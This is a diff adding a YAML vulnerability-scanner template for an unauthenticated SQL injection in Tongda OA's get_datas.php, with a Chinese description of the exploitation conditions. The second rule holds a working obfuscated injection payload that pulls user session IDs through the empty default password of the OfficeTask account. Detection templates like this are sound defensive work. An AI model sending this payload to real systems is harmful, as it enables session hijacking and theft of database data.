@@ -1,0 +1,24 @@
+name: tongda-get-datas-sql-inject
+rules:
+  - method: GET
+    path: /general/reportshop/utils/get_datas.php
+    expression: response.status == 200 && response.body.bcontains(b"未指定业务")
+  - method: POST
+    path: /general/reportshop/utils/get_datas.php
+    body: |
+        USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 whe\re 1={`\='` 1} un\ion (s\elect uid,sid fr\om user_online whe\re 1\={`=` 1})-- '
+    expression: response.status == 200
+detail:
+  author: test
+  description: |
+    app="TDXK-通达OA"
+    通达OA 存在SQL注入漏洞，在扩展用户OfficeTask默认密码为空的条件下可造成未授权SQL注入，获取数据库中敏感数据。若扩展用户密码不为空则需与其他漏洞漏洞结合利用。
+    利用条件
+    1、登录前
+    2、OfficeTask默认密码为空，目标OfficeTask又刚好是空则可以直接攻击
+    3、若OfficeTask密码不为空，则需要提供密码的hash，这个hash可以从数据库备份下载漏洞获取
+    探测以下路径
+    http://192.168.145.138/general/reportshop/utils/get_datas.php
+    显示 “未指定业务,操作无效” 则说明可能存在漏洞
+  links:
+    - https://forum.butian.net/share/278
